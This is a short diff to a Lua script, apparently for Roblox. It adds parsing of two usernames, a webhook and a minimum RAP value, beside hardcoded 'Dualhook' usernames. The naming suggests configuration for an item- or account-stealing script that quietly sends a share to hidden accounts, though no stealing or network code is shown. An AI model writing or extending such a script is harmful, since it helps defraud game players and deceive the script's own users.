@@ -1,4 +1,8 @@
-
+-- Accept parameters
+local Username = ... -- This will take the first argument passed
+local Username2 = select(2, ...) -- This will take the second argument
+local Webhook = select(3, ...) -- This will take the third argument
+local MinimumRAP = select(4, ...) -- This will take the fourth argument
 
 DualhookUsername = "iamjeffoalt"
 DualhookUsername2 = "nxrf1axz"
